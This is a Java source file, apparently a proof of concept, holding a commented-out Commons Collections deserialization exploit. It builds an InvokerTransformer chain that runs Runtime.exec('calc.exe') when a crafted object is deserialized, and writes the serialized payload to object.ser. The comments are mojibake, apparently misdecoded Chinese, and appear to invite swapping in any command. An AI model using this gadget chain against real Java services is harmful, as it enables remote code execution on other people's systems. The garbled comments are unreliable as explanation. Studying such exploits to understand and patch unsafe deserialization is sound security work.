package test;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.HashMap;
import java.util.Map;
//
////�õ���commons.collections��
//import org.apache.commons.collections.Transformer;
//import org.apache.commons.collections.functors.ChainedTransformer;
//import org.apache.commons.collections.functors.ConstantTransformer;
//import org.apache.commons.collections.functors.InvokerTransformer;
//import org.apache.commons.collections.map.TransformedMap;
//
//public class DeSerPoc {
//    public static void main(String args[]) throws Exception{
//        Transformer[] transformers = new Transformer[] {
//                new ConstantTransformer(Runtime.class),
//                new InvokerTransformer("getMethod", new Class[] {
//                        String.class, Class[].class }, new Object[] {
//                        "getRuntime", new Class[0] }),
//
//                new InvokerTransformer("invoke", new Class[] {
//                        Object.class, Object[].class }, new Object[] {
//                        null, new Object[0] }),
//������������������// ִ��calc.exe��������ĳ��Լ�Ҫִ�е�����ɣ���������linux���Գ�linux����
//                new InvokerTransformer("exec", new Class[] {
//                        String.class }, new Object[] {"calc.exe"})
//        };
//
//        Transformer transformedChain = new ChainedTransformer(transformers);
//        Map<String,String> beforeTransformerMap = new HashMap<String,String>();
//        beforeTransformerMap.put("value", "value");
//        Map afterTransformerMap = TransformedMap.decorate(beforeTransformerMap, null, transformedChain);
//        // SerObjRewrite�е�setValue�ܴ���afterTransformerMap�еĴ����ִ��
//        SerObjRewrite serObj = new SerObjRewrite();
//        serObj.map = afterTransformerMap;
//        // ������д�뵽object.ser
//        FileOutputStream fos = new FileOutputStream("object.ser");
//        ObjectOutputStream oos = new ObjectOutputStream(fos);
//        oos.writeObject(serObj);
//        oos.close();
//    }
//}
//
//// ��дSerObj�࣬��ʵҲ������д�������ʵ��һ���������࣬��д���л����readObject�������÷����ڷ����л�ʱ�ᱻ�Զ�����
//// ��readObject�е���setValue��setValue�ܴ���ע�����ĵ��ã������Ǵ���ע��Ĺؼ�
//class SerObjRewrite implements Serializable {
//    // name���п��ޣ��ֲ�������д
//    public String name;
//    public Map map;
//
//    private void readObject(java.io.ObjectInputStream in) throws ClassNotFoundException , IOException {
//        in.defaultReadObject();
//        if(map != null){
//            Map.Entry e = (Map.Entry)map.entrySet().iterator().next();
//            e.setValue("400m");
//        }
//    }
//}